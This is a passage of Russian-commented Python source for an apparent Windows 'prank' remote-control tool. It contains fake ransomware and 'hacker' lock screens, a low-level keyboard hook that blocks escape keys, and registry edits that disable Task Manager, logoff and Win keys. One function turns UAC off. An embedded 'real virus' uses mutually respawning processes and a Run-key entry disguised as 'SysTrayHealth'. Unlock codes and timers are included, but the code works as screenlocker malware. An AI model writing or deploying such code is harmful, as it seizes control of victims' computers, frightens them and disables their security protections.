    r = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, str(path), 3)
    return "🌆 обои поставлены" if r else "🌆 обои не взялись (нужен jpg/bmp)"

# ---------- приколы: звук ----------
def _p_beep() -> str:
    try:
        import winsound
        notes = [392, 440, 494, 587, 494, 440, 392, 349, 330, 294, 330, 392, 262]
        for f in notes:
            winsound.Beep(f, 300)
        return "🎵 бип-мелодия отзвенела"
    except Exception:
        return "🔇 звукового устройства нет — тишина в зале"

def _p_siren() -> str:
    try:
        import winsound
        end = time.time() + 15
        hi = False
        while time.time() < end:
            winsound.Beep(750 if hi else 950, 420)
            hi = not hi
    except Exception:
        pass
    return "🎺 сирена отзвенела — соседи в курсе"

def _p_voice() -> str:
    phrase = "Привет! Твой компьютер был перепрошит. Сядь ровно и не забудь про осанку."
    ps = ("$v = New-Object -ComObject SAPI.SpVoice; $v.Rate = 3; $v.Volume = 100; "
          f"$v.Speak('{phrase}')")
    try:
        subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                       capture_output=True, timeout=30)
    except subprocess.TimeoutExpired:
        pass
    return "🗣 голос из ниоткуда изрёк мудрость"

def _p_volume() -> str:
    for _ in range(100):
        press_key(0xAF)
    return "🔊 громкость в потолок"

def _p_caps() -> str:
    for _ in range(30):
        press_key(0x14)
        time.sleep(0.04)
    return "⌨️ capslock отщёлкал 30 раз"

def _p_player() -> str:
    for _ in range(25):
        press_key(0xB3)                       # VK_MEDIA_PLAY_PAUSE
        time.sleep(0.08)
    return "▶️ плеер заикался 25 раз"

# ---------- приколы: жёсткие (18+) ----------
KB_CODE = "0007"    # секретный код владельца — цифры подряд на клавиатуре

def _hook_thread(stop_evt: threading.Event, unlock_evt: threading.Event,
                 ring: dict, deadline: float):
    """WH_KEYBOARD_LL: жрёт WIN / Alt+Tab / Alt+F4 / ESC, цифры пишет только
    в буфер кода владельца. Сам снимается по дедлайну или stop_evt —
    страховка обязательна, засада на клавиатуре всегда обречена."""
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    WM_QUIT = 0x0012

    def proc(code, wp, lp):
        if code < 0:
            return user32.CallNextHookEx(None, code, wp, lp)
        try:
            kb = ctypes.cast(lp, ctypes.POINTER(_KBDLLHOOK)).contents
        except Exception:
            return user32.CallNextHookEx(None, code, wp, lp)
        down = wp in (0x0100, 0x0104)                     # KEYDOWN / SYSKEYDOWN
        vk = kb.vkCode
        if down:
            alt = user32.GetAsyncKeyState(0x12) & 0x8000  # ALT
            if vk in (0x5B, 0x5C):                        # WIN л/п
                return 1
            if vk == 0x09 and alt:                        # Alt+Tab
                return 1
            if vk == 0x70 and alt:                        # Alt+F4
                return 1
            if vk == 0x1B:                                # ESC
                return 1
            if 0x30 <= vk <= 0x39 or 0x60 <= vk <= 0x69:   # цифры → только в код
                ring["s"] = (ring["s"] + str(vk % 10))[-8:]
                if KB_CODE in ring["s"]:
                    unlock_evt.set()
                return 1
        return user32.CallNextHookEx(None, code, wp, lp)

    handler = _KBDPROC(proc)          # держим живым — GC иначе съест колбек
    h = user32.SetWindowsHookExW(13, handler, None, 0)   # WH_KEYBOARD_LL
    if not h:
        return
    tid = kernel32.GetCurrentThreadId()

    def watchdog():
        stop_evt.wait(timeout=max(1.0, deadline - time.time()))
        user32.PostThreadMessageW(tid, WM_QUIT, 0, 0)

    threading.Thread(target=watchdog, daemon=True).start()
    msg = _MSG_A()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))
        if time.time() > deadline:
            user32.PostThreadMessageW(tid, WM_QUIT, 0, 0)
    user32.UnhookWindowsHookEx(h)

def _winlock_worker(countdown: int = 120):
    """ВИНЛОКЕР: fullscreen + topmost, хук жрёт побеги, отступает по коду,
    по таймеру или по страховочному капу — управление вернётся всегда."""
    unlock_evt, stop_evt = threading.Event(), threading.Event()
    ring = {"s": ""}
    deadline = time.time() + countdown + 60
    threading.Thread(target=_hook_thread, daemon=True,
                     args=(stop_evt, unlock_evt, ring, deadline)).start()
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="#070303")
        root.focus_force()

        can = tk.Canvas(root, width=252, height=252, bg="#070303", highlightthickness=0)
        for gx in range(21):
            for gy in range(21):
                if random.random() < 0.46:      # фейковый QR — выглядит по-настоящему
                    can.create_rectangle(3 + gx * 12, 3 + gy * 12,
                                         11 + gx * 12, 11 + gy * 12,
                                         fill="#f5f5f5", width=0)
        can.place(relx=0.5, rely=0.26, anchor="center")

        tk.Label(root, text="☠ ПК ЗАБЛОКИРОВАН ☠", font=("Segoe UI", 42, "bold"),
                 fg="#ff2b2b", bg="#070303").place(relx=0.5, rely=0.02, anchor="n")
        tk.Label(root, text=("все файлы ушли под армейский замок:\n"
                             "документы, фото, дипломы — всё сковано льдом\n"
                             "откуп: 3000₽. кошель оставлен в чате"),
                 font=("Segoe UI", 16), fg="#e6d6d6", bg="#070303",
                 justify="center").place(relx=0.5, rely=0.47, anchor="center")
        clock = tk.Label(root, font=("Consolas", 60, "bold"), fg="#ff2b2b", bg="#070303")
        clock.place(relx=0.5, rely=0.60, anchor="center")
        whisper = tk.Label(root, font=("Consolas", 13), fg="#6b4f4f", bg="#070303")
        whisper.place(relx=0.5, rely=0.71, anchor="center")

        WHISPERS = ["мы читали историю браузера. всё.",
                    "веб-камера мигнула дважды — это не мы",
                    "диплом_финал_финал2.docx уже в шоке",
                    "не трогай Ctrl+Alt+Del — он с нами",
                    "cookies проданы. шоколадные."]
        state = {"left": countdown}

        def die():
            try:
                if root.winfo_exists():
                    root.destroy()
            except Exception:
                pass

        def steal(_e=None):
            if root.winfo_exists():
                root.lift()
                root.attributes("-topmost", True)
                root.focus_force()
        root.bind("<FocusOut>", steal)
        root.bind("<Button-1>", steal)
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        def tick():
            if not root.winfo_exists():
                return
            steal()
            if unlock_evt.is_set():
                clock.config(text="КОД ПРИНЯТ", fg="#39ff14")
                whisper.config(text="владелец вспомнил пароль. файлы целы. шутка.",
                               fg="#39ff14")
                root.after(3500, die)
                return
            if state["left"] <= 0:
                clock.config(text="ВРЕМЯ ВЫШЛО", fg="#39ff14")
                whisper.config(text="…и ровным счётом ничего. это была шутка.",
                               fg="#39ff14")
                root.after(4000, die)
                return
            m, s = divmod(state["left"], 60)
            clock.config(text=f"{m}:{s:02d}")
            if state["left"] % 5 == 0:
                whisper.config(text=random.choice(WHISPERS))
            state["left"] -= 1
            root.after(1000, tick)
        tick()
        root.after((countdown + 20) * 1000, die)     # страховка: управление вернётся
        root.mainloop()
    except Exception:
        pass
    finally:
        stop_evt.set()

def _p_winlock() -> str:
    threading.Thread(target=_winlock_worker, kwargs={"countdown": 120},
                     daemon=True).start()
    return ("🏴 WINLOCKER встал на 2 минуты.\n"
            "код разблокировки: 0007 (набрать цифры прямо на экране)\n"
            "снимется и сам по таймеру — всё под контролем владельца")

def _format_targets() -> list[str]:
    """реальные имена файлов (только НА ЧТЕНИЕ) — для театра удаления"""
    pool: list[str] = []
    for name in ("Desktop", "Documents", "Downloads", "Pictures", "Music", "Videos"):
        base = Path.home() / name
        try:
            for entry in base.iterdir():
                pool.append(str(entry))
                if entry.is_dir():
                    try:
                        pool.extend(str(p) for p in entry.iterdir())
                    except OSError:
                        pass
        except OSError:
            pass
    sysdir = Path(os.environ.get("WINDIR", r"C:\Windows")) / "System32"
    try:
        pool.extend(str(p) for p in sysdir.iterdir() if p.is_file())
    except OSError:
        pass
    return pool[:600] or [r"C:\шутка-запасной-файл.docx"]

def _format_worker():
    import tkinter as tk
    targets = _format_targets()
    try:
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="#000000")
        root.focus_force()
        txt = tk.Text(root, bg="#000000", fg="#d6d6d6", font=("Consolas", 12),
                      border=0, highlightthickness=0)
        txt.pack(fill="both", expand=True)
        txt.tag_config("warn", foreground="#ff4d4d")

        def die():
            try:
                if root.winfo_exists():
                    root.destroy()
            except Exception:
                pass
        root.bind("<Escape>", lambda e: die())
        root.bind("<Button-1>", lambda e: die())

        def push(text, warn=False):
            if not root.winfo_exists():
                return
            txt.insert("end", text + "\n", ("warn",) if warn else ())
            txt.see("end")
            txt.update_idletasks()

        init = [
            "Microsoft Windows [Version 10.0.26100.0007]",
            "(c) Корпорация Хаоса. Все права утрачены.", "",
            "C:\\Users\\владелец>format C: /FS:NTFS /X /Q", "",
            "ВНИМАНИЕ: ВСЕ ДАННЫЕ НА ДИСКЕ C: БУДУТ УНИЧТОЖЕНЫ!",
            "Продолжить [Y/N]? Y", "",
        ]
        state = {"i": 0}
        def tick():
            if not root.winfo_exists():
                return
            if state["i"] < len(init):
                push(init[state["i"]])
                state["i"] += 1
                root.after(700, tick)
                return
            idx = state["i"] - len(init)
            total = len(targets)
            if idx < total:
                push("Удаление: " + targets[idx])
                state["i"] += 1
                if idx % 22 == 0:
                    pct = int(idx / total * 97)
                    push(f"Прогресс: {pct}%  [{'█' * (pct // 5):<20}]")
                root.after(45, tick)
                return
            push("")
            push("Диск C: очищен. Файлы утрачены навсегда.", warn=True)
            push("")
            push("шутка. диск жив, файлы целы — выдохнул уже? :)", warn=True)
            push("это было представление. до встречи.")
            root.after(3500, die)
        tick()
        root.after(75_000, die)          # страховочный кап
        root.mainloop()
    except Exception:
        pass

def _p_format() -> str:
    threading.Thread(target=_format_worker, daemon=True).start()
    return "🧨 «format C:» идёт (читает ТОЛЬКО имена, не трогает файлы). ESC — выход"

def _hacker_worker():
    import tkinter as tk
    try:
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="#000600")
        root.focus_force()
        canvas = tk.Canvas(root, bg="#000600", highlightthickness=0)
        canvas.pack(fill="both", expand=True)
        ncols = max(40, root.winfo_screenwidth() // 16)
        GLYPHS = "01ФЦЧШЩЗХЪЭЮЯ$#%&@*+=<>アイウエオカキクケコ"
        items = [canvas.create_text(8 + i * 16, -random.randint(0, 260), anchor="nw",
                                    text="", fill="#3dff6e", font=("Consolas", 12))
                 for i in range(ncols)]
        panel = tk.Label(root, font=("Consolas", 12), fg="#aaffb0", bg="#000600",
                         justify="left", anchor="nw", text="[*] initializing payload…")
        panel.place(relx=0.02, rely=0.03, anchor="nw")
        tk.Label(root, text="ВАШ ПК ХАКНУТ", font=("Consolas", 44, "bold"),
                 fg="#3dff6e", bg="#000600").place(relx=0.99, rely=0.05, anchor="ne")
        flow = tk.Label(root, font=("Consolas", 18), fg="#3dff6e", bg="#000600",
                        text="загрузка ваших данных в сеть: 0%")
        flow.place(relx=0.99, rely=0.52, anchor="ne")
        cam = tk.Canvas(root, width=260, height=200, bg="#000000", highlightthickness=2,
                        highlightbackground="#3dff6e")
        cam.place(relx=0.99, rely=0.97, anchor="se")
        cam.create_text(130, 88, text="REC ●\n\nCAM_0", fill="#3dff6e",
                        font=("Consolas", 15, "bold"))
        LOGS = ["[+] подключение к тор-ноде 127.0.0.1:9051",
                "[+] сессия перехвачена, cookies уплыли",
                "[*] CAM_0 пишет: 00:14:03",
                "[+] история браузера: 2.4 ГБ → сжата",
                "[*] ваш пароль: hunter2 (уже в базе)",
                "[+] пакет 0x4F отослан, ждём эхо",
                "[*] веб-камера: активна с 19:42",
                "[+] микрофонный пул: 3.7 минуты свежей записи"]
        state = {"s": [""] * ncols, "n": 0, "pct": 0}

        def die():
            try:
                if root.winfo_exists():
                    root.destroy()
            except Exception:
                pass
        root.bind("<Escape>", lambda e: die())
        root.bind("<Button-1>", lambda e: die())

        def tick():
            if not root.winfo_exists():
                return
            for i, item in enumerate(items):
                s = state["s"][i]
                if random.random() < 0.65 and len(s) < 24:
                    s += random.choice(GLYPHS)
                else:
                    s = s[1:]
                state["s"][i] = s
                canvas.itemconfig(item, text=s)
                x, y = canvas.coords(item)
                if y > root.winfo_screenheight() + 40:
                    canvas.coords(item, x, -random.randint(0, 260))
                    state["s"][i] = ""
                else:
                    canvas.coords(item, x, y + 7)
            state["n"] += 1
            if state["n"] % 9 == 0:
                panel.config(text="\n".join(random.sample(LOGS, 4)))
            if state["n"] % 7 == 0 and state["pct"] < 99:
                state["pct"] += 1
                flow.config(text=f"загрузка ваших данных в сеть: {state['pct']}%")
            root.after(55, tick)
        tick()
        root.after(45_000, die)
        root.mainloop()
    except Exception:
        pass

def _p_hacker() -> str:
    threading.Thread(target=_hacker_worker, daemon=True).start()
    return "👁 хакер влез (по сценарию). 45с экспозиции. ESC — досрочно"

def _battery_worker(downtime: int = 9, quiet_end: bool = False):
    """фейк-тост → критический заряд с отсчётом → чернота → (псишь)"""
    import tkinter as tk
    try:
        W = ctypes.windll.user32.GetSystemMetrics(0)
        H = ctypes.windll.user32.GetSystemMetrics(1)
        toast = tk.Tk()
        toast.overrideredirect(True)
        toast.attributes("-topmost", True)
        bw, bh = 390, 150
        toast.geometry(f"{bw}x{bh}+{W - bw - 24}+{H - bh - 96}")
        toast.configure(bg="#1f1f1f")
        tk.Label(toast, text="🔋 Аккумулятор разряжен (1%)",
                 font=("Segoe UI", 14, "bold"), fg="#ffffff", bg="#1f1f1f",
                 anchor="nw", justify="left").pack(fill="x", padx=14, pady=(12, 2))
        tk.Label(toast, text="Подключите зарядное устройство. ПК отключится.",
                 font=("Segoe UI", 11), fg="#c9c9c9", bg="#1f1f1f",
                 anchor="nw", justify="left").pack(fill="x", padx=14)
        toast.after(4200, toast.destroy)
        toast.mainloop()
    except Exception:
        pass
    try:
        scr = tk.Tk()
        scr.attributes("-fullscreen", True, "-topmost", True)
        scr.configure(bg="#0b2d5c")
        scr.focus_force()
        tk.Label(scr, text="\n\n🔋", font=("Segoe UI Emoji", 90), fg="#ffffff",
                 bg="#0b2d5c").place(relx=0.5, rely=0.26, anchor="center")
        tk.Label(scr, text="Заряд батареи критически низок.\nПодключите зарядное устройство.",
                 font=("Segoe UI", 26), fg="#ffffff", bg="#0b2d5c",
                 justify="center").place(relx=0.5, rely=0.42, anchor="center")
        ttl = tk.Label(scr, font=("Segoe UI", 60, "bold"), fg="#ffffff", bg="#0b2d5c")
        ttl.place(relx=0.5, rely=0.58, anchor="center")
        state = {"left": downtime}
        def die():
            try:
                if scr.winfo_exists():
                    scr.destroy()
            except Exception:
                pass
        def tick():
            if not scr.winfo_exists():
                return
            if state["left"] <= 0:
                die()
                return
            ttl.config(text=str(state["left"]))
            state["left"] -= 1
            scr.after(900, tick)
        tick()
        scr.mainloop()
    except Exception:
        pass
    try:
        black = tk.Tk()
        black.attributes("-fullscreen", True, "-topmost", True)
        black.configure(bg="#000000")
        black.focus_force()
        def out():
            try:
                if black.winfo_exists():
                    black.destroy()
            except Exception:
                pass
        if not quiet_end:
            tk.Label(black, text="псишь.\nПК включился как ни в чём не бывало :)",
                     font=("Segoe UI", 22), fg="#dddddd", bg="#000000",
                     justify="center").place(relx=0.5, rely=0.5, anchor="center")
            black.bind("<Escape>", lambda e: out())
            black.bind("<Button-1>", lambda e: out())
        black.after(4200 if quiet_end else 3400, out)
        black.mainloop()
    except Exception:
        pass

def _p_battery() -> str:
    threading.Thread(target=_battery_worker, kwargs={"downtime": 9},
                     daemon=True).start()
    return "🔋 заряд ушёл… по сценарию. ESC после тоста — выход"

def _p_lock() -> str:
    ctypes.windll.user32.LockWorkStation()
    return "🖥 экран заблокирован"

def _p_msgbox() -> str:
    def worker():
        texts = ["Тут нечего кликать", "Это тоже пусто", "Всё ещё скучно?",
                 "Ок, это последнее", "Шутка закончилась :)"]
        for t in texts:
            ctypes.windll.user32.MessageBoxW(None, t, "СИСТЕМНОЕ СООБЩЕНИЕ",
                                             0x40 | 0x40000)
    threading.Thread(target=worker, daemon=True).start()
    return "💬 5 саркастических окон уже ждут крестика"

# ---------- приколы: комбо ----------
def _p_apocalypse() -> str:
    threading.Thread(target=_bsod_worker, daemon=True).start()
    _p_siren()
    threading.Thread(target=_blackout_worker,
                     kwargs={"mute_secs": 10, "hint": "☠️ файлы «удалены»…"}, daemon=True).start()
    time.sleep(20)
    threading.Thread(target=_invert_worker, daemon=True).start()
    return "☠️ конец света отыгран: синяк → сирена → тьма → негатив. живи дальше"

def _p_judgment() -> str:
    def seq():
        _battery_worker(downtime=6, quiet_end=True)
        time.sleep(1.5)
        _winlock_worker(countdown=45)
        threading.Thread(target=_blackout_worker,
                         kwargs={"mute_secs": 7,
                                 "hint": "💀 ты выжил. шутка кончилась"},
                         daemon=True).start()
    threading.Thread(target=seq, daemon=True).start()
    return "💀 СУДНАЯ НОЧЬ 2.0: разряд → замок → тьма.\nкод замка: 0007"

# ---------- приколы: система-шутки ----------
POLICY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
EXPL_PATH   = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"

def hide_cad() -> str:
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, POLICY_PATH) as k:
        for n in ("DisableTaskMgr", "DisableChangePassword", "DisableLockWorkstation",
                  "HideFastUserSwitching", "NoDispCPL"):
            winreg.SetValueEx(k, n, 0, winreg.REG_DWORD, 1)
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, EXPL_PATH) as k:
        for n in ("NoLogoff", "NoClose", "NoRun", "NoWinKeys", "NoViewContextMenu", "NoTrayContextMenu"):
            winreg.SetValueEx(k, n, 0, winreg.REG_DWORD, 1)
    return ("🙈 Скрыл кнопки Ctrl+Alt+Del и впридачу всякую дичь:\n"
            "• Диспетчер задач, Смена пароля, Блокировка, Смена юзера — скрыты\n"
            "• Выход, Завершение работы, меню Выполнить, Win-хоткеи,\n"
            "  контекстные меню стола/трея, Панель управления — всё замуровано\n"
            "вернуть — кнопка 🙈 Вернуть")

def show_cad() -> str:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, POLICY_PATH, 0, winreg.KEY_SET_VALUE) as k:
            for n in ("DisableTaskMgr", "DisableChangePassword", "DisableLockWorkstation",
                      "HideFastUserSwitching", "NoDispCPL"):
                try: winreg.DeleteValue(k, n)
                except FileNotFoundError: pass
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, EXPL_PATH, 0, winreg.KEY_SET_VALUE) as k:
            for n in ("NoLogoff", "NoClose", "NoRun", "NoWinKeys", "NoViewContextMenu", "NoTrayContextMenu"):
                try: winreg.DeleteValue(k, n)
                except FileNotFoundError: pass
    except FileNotFoundError:
        return "🙈 ничего не прятилось — и так чисто"
    return "🙈 Кнопки Ctrl+Alt+Del и вся дичь вернулись"

def uac_set(state: int) -> str:
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return "🔒 нужно админство: запуск пульта от имени администратора"
    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, POLICY_PATH) as k:
        winreg.SetValueEx(k, "EnableLUA", 0, winreg.REG_DWORD, state)
        winreg.SetValueEx(k, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
    state_line = "UAC выключен" if state == 0 else "UAC включен"
    return f"🔒 {state_line} — перезапуск Windows после полного применения"

# ---------- НАСТОЯЩИЕ ВИРУСЫ ----------
# архитектура: вирусы живут в СВОИХ процессах (не в боте) парами a+b,
# брат следит за братом, убили одного — второй пересоздаёт.
# окно без крестика и ESC, диспетчер задач замурован.
# снять можно только кнопками 🆘/🔓 отсюда (как и кулдаун — не тронут).
VIRUS_DIR = DATA_DIR / "vcore"
VIRUS_JOBS = ("winlock", "explorer", "wall", "trap", "madness")
RUN_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
PERSIST_NAME = "SysTrayHealth"

VIRUS_SRC = r'''
# toxik.py — парный вирус. роль a работает, роль b сторожит.
# сдох a — b его пересоздаёт. сдох b — a пересоздаёт b. выход — только stop-флаг.
import os, sys, time, random, subprocess, threading, ctypes
from pathlib import Path
from ctypes import wintypes

JOB = sys.argv[1] if len(sys.argv) > 1 else "winlock"
ROLE = sys.argv[2] if len(sys.argv) > 2 else "a"
BASE = Path(__file__).resolve().parent
STOPF = BASE / ("stop_" + JOB + ".flag")
PIDF = BASE / (JOB + "_" + ROLE + ".pid")
PEER_ROLE = "b" if ROLE == "a" else "a"
PEERF = BASE / (JOB + "_" + PEER_ROLE + ".pid")
SELF = str(Path(__file__).resolve())
PYEXE = sys.executable or "python"
OWNER_CODE = "0007"    # код владельца: цифры подряд — сам снимает (страховка)
TRAP_CAP = 600.0       # мышь-заложник остаётся ВРЕМЕННЫМ приколом: сам отпускает через 10 мин

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
# LPARAM 64-битный: без этого CallNextHookEx кидает OverflowError на каждом
# событии, "Exception ignored" и крюк умирает по таймауту
user32.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM]
user32.CallNextHookEx.restype = ctypes.c_ssize_t
DEAD = threading.Event()

def log(msg):
    try:
        with open(BASE / "virus.log", "a", encoding="utf-8") as f:
            f.write(time.strftime("[%H:%M:%S] ") + JOB + "/" + ROLE + " " + msg + "\n")
    except Exception:
        pass

ABORTF = BASE / "abort.flag"

def stop_now():
    return STOPF.exists() or ABORTF.exists()

def write_stop():
    try:
        STOPF.write_text("x")
    except Exception:
        pass

def write_abort():
    # машинный общий стоп: кто первым ввёл код владельца — гасит ВЕСЬ вирусарий
    try:
        ABORTF.write_text("x")
    except Exception:
        pass
    for job in ("winlock", "explorer", "wall", "trap", "madness"):
        try:
            (BASE / ("stop_" + job + ".flag")).write_text("x")
        except Exception:
            pass

def spawn_peer():
    try:
        subprocess.Popen([PYEXE, SELF, JOB, PEER_ROLE], cwd=str(BASE), close_fds=True,
                         creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
        log("поднял брата " + PEER_ROLE)
    except Exception as e:
        log("брат не поднялся: " + repr(e))

def pid_alive(raw):
    try:
        pid = int(str(raw).strip())
    except Exception:
        return False
    if pid <= 0 or pid == os.getpid():
        return False
    h = kernel32.OpenProcess(0x1000, False, pid)
    if h:
        kernel32.CloseHandle(h)
        return True
    return False

def peer_alive():
    try:
        return pid_alive(PEERF.read_text())
    except Exception:
        return False

def write_pid():
    try:
        PIDF.write_text(str(os.getpid()))
    except Exception:
        pass

def cleanup_pid():
    try:
        PIDF.unlink()
    except Exception:
        pass

def guardian():
    while not DEAD.is_set():
        if stop_now():
            DEAD.set()
            break
        if not peer_alive():
            spawn_peer()
        time.sleep(0.8)

class _KBDLL(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]

class _MSG(ctypes.Structure):
    class _PT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
    _fields_ = [("hwnd", wintypes.HWND), ("message", wintypes.UINT),
                ("wParam", wintypes.WPARAM), ("lParam", wintypes.LPARAM),
                ("time", wintypes.DWORD), ("pt", _PT)]

_HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
HOOK_KEEP = {"proc": None, "hook": None}   # ЖИЗНЕННО: держим ссылки, иначе GC съест колбек

def hook_worker(code_evt, ready_evt):
    ring = {"s": ""}

    def on_key(code, wp, lp):
        if code < 0:
            return user32.CallNextHookEx(None, code, wp, lp)
        try:
            kb = ctypes.cast(lp, ctypes.POINTER(_KBDLL)).contents
        except Exception:
            return user32.CallNextHookEx(None, code, wp, lp)
        if wp in (0x0100, 0x0104):
            vk = kb.vkCode
            alt = user32.GetAsyncKeyState(0x12) & 0x8000
            ctrl = user32.GetAsyncKeyState(0x11) & 0x8000
            if vk in (0x5B, 0x5C):
                return 1
            if vk == 0x09 and (alt or ctrl):
                return 1
            if vk == 0x73 and alt:
                return 1
            if vk == 0x1B:
                return 1
            if 0x30 <= vk <= 0x39 or 0x60 <= vk <= 0x69:
                ring["s"] = (ring["s"] + str(vk % 10))[-8:]
                if OWNER_CODE in ring["s"]:
                    code_evt.set()
                    return 1
                # прочие цифры пропускаем — тогда они доезжают и до поля ввода
                return user32.CallNextHookEx(None, code, wp, lp)
            return user32.CallNextHookEx(None, code, wp, lp)

    proc = _HOOKPROC(on_key)
    hook = user32.SetWindowsHookExW(13, proc, None, 0)
    if not hook:
        log("крюк не встал")
        ready_evt.set()
        return
    HOOK_KEEP["proc"] = proc     # держим живым до конца жизни процесса
    HOOK_KEEP["hook"] = hook
    ready_evt.set()
    msg = _MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
        if code_evt.is_set() or DEAD.is_set():
            break
    user32.UnhookWindowsHookEx(hook)
    HOOK_KEEP["hook"] = None

def install_hook():
    """крюк ставится и качается В ОДНОМ потоке; колбек закреплён навсегда"""
    code_evt = threading.Event()
    ready = threading.Event()
    threading.Thread(target=hook_worker, args=(code_evt, ready), daemon=True).start()
    ready.wait(timeout=3.0)
    return code_evt

def _code_ring_tk(code_evt):
    """дублирующий приём кода прямо через окно — работает даже с мёртвым крюком"""
    ring = {"s": ""}
    def handler(e):
        ch = getattr(e, "char", "") or ""
        if len(ch) == 1 and ch.isdigit():
            ring["s"] = (ring["s"] + ch)[-8:]
            if OWNER_CODE in ring["s"]:
                code_evt.set()
        return "break"
    return handler

def _code_entry_tk(root, code_evt, big_font=24):
    """видимое поле ввода: 0007 или sos прямо на экране — работает даже с мёртвым крюком"""
    import tkinter as tk
    box = tk.Entry(root, font=("Consolas", big_font, "bold"), justify="center", width=18,
                   fg="#39ff14", bg="#140000", insertbackground="#39ff14",
                   highlightthickness=1, highlightbackground="#5a0000")
    def check(_e=None):
        v = box.get().lower()
        if "0007" in v or "sos" in v:
            box.delete(0, "end")
            write_abort()
            if code_evt is not None:
                code_evt.set()
    box.bind("<KeyRelease>", check)
    box.bind("<Return>", lambda e: check() or "break")
    box.bind("<KP_Enter>", lambda e: check() or "break")
    box.focus_set()
    return box

class _P2(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

class _R2(ctypes.Structure):
    _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
                ("r", ctypes.c_long), ("b", ctypes.c_long)]

def overlay_winlock(evt):
    import tkinter as tk
    root = tk.Tk()
    root.attributes("-fullscreen", True, "-topmost", True)
    root.overrideredirect(True)
    root.configure(bg="#050000")
    root.focus_force()
    root.bind("<Key>", _code_ring_tk(evt))   # дубли кода: вводим хоть куда, хоть без крюка
    tk.Label(root, text="☠  D E A D L O C K  ☠", font=("Consolas", 46, "bold"),
             fg="#ff1a1a", bg="#050000").place(relx=0.5, rely=0.05, anchor="n")
    tk.Label(root, text="система захвачена · файлы зашифрованы · AES-256-CBC + RSA-4096",
             font=("Consolas", 15), fg="#d8d8d8", bg="#050000").place(relx=0.5, rely=0.13, anchor="n")
    can = tk.Canvas(root, width=260, height=260, bg="#050000",
                    highlightthickness=1, highlightbackground="#5a0000")
    for gx in range(26):
        for gy in range(26):
            if random.random() < 0.45:
                can.create_rectangle(4 + gx * 10, 4 + gy * 10, 10 + gx * 10, 10 + gy * 10,
                                     fill="#f2f2f2", width=0)
    can.place(relx=0.5, rely=0.48, anchor="center")
    wallet = tk.Label(root, text=("кошелёк откупа: bc1qdeadlock0x82f1ab34\n"
                                  "сумма: 3000 ₽ · ключ придёт после оплаты"),
                      font=("Consolas", 15), fg="#ffd166", bg="#050000", justify="center")
    wallet.place(relx=0.5, rely=0.77, anchor="center")
    timer = tk.Label(root, font=("Consolas", 34, "bold"), fg="#ff1a1a", bg="#050000")
    timer.place(relx=0.5, rely=0.64, anchor="center")
    entry = _code_entry_tk(root, evt)
    entry.place(relx=0.5, rely=0.86, anchor="center")
    whisper = tk.Label(root, font=("Consolas", 12), fg="#7a4d4d", bg="#050000")
    whisper.place(relx=0.5, rely=0.965, anchor="center")
    TIPS = ["диспетчер задач? замурован", "alt+f4 уволился молча",
            "процессов двое — воскресают оба", "перезагрузка? вопрос к автозапуску",
            "cry, ночи долгие", "пытаться бессмысленно"]
    t0 = time.time()

    def tick():
        if evt is not None and evt.is_set():
            timer.config(text="КЛЮЧ ПРИНЯТ", fg="#39ff14")
            whisper.config(text="владелец одумался. свобода.", fg="#39ff14")
            root.after(2200, root.destroy)
            return
        if stop_now():
            root.destroy()
            return
        secs = int(time.time() - t0)
        timer.config(text="в плену: " + time.strftime("%H:%M:%S", time.gmtime(secs)))
        if random.random() < 0.07:
            whisper.config(text=random.choice(TIPS))
        root.lift()
        root.attributes("-topmost", True)
        entry.focus_force()
        root.after(700, tick)
    tick()
    root.mainloop()

def overlay_trap(evt=None, until=None):
    import tkinter as tk
    W, H = 320, 170
    box = _R2()
    pt = _P2()
    user32.GetCursorPos(ctypes.byref(pt))
    cx = min(max(W // 2, pt.x), user32.GetSystemMetrics(0) - W // 2 - 8)
    cy = min(max(H // 2, pt.y), user32.GetSystemMetrics(1) - H // 2 - 40)
    box.l, box.t, box.r, box.b = cx - W // 2, cy - H // 2, cx + W // 2, cy + H // 2
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.geometry(str(W) + "x" + str(H) + "+" + str(box.l) + "+" + str(box.t))
    root.configure(bg="#7a0000")
    if evt is not None:
        root.bind("<Key>", _code_ring_tk(evt))
    tk.Label(root, text="🔒 мышь прикована",
             font=("Consolas", 12, "bold"), fg="#ffffff", bg="#7a0000").place(relx=0.5, rely=0.14, anchor="center")
    left = tk.Label(root, font=("Consolas", 11), fg="#ffd166", bg="#7a0000")
